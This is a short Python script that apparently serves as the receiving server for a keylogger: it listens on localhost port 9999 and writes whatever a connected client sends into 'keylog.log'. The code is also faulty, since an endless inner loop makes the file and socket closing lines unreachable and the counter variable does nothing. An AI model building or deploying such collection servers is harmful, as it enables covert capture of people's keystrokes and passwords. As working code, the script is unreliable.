import socket
import sys

s = socket.socket()
s.bind(("localhost",9999))
s.listen(1)

while True:
    sc, address = s.accept()

    print(address)
    i=1
    f = open('keylog.log','wb') #open in binary
    i=i+1
    while (True):       
    # receive data and write it to file
        l = sc.recv(1024)
        while (l):
                f.write(l)
                l = sc.recv(1024)
    f.close()

    sc.close()

s.close()
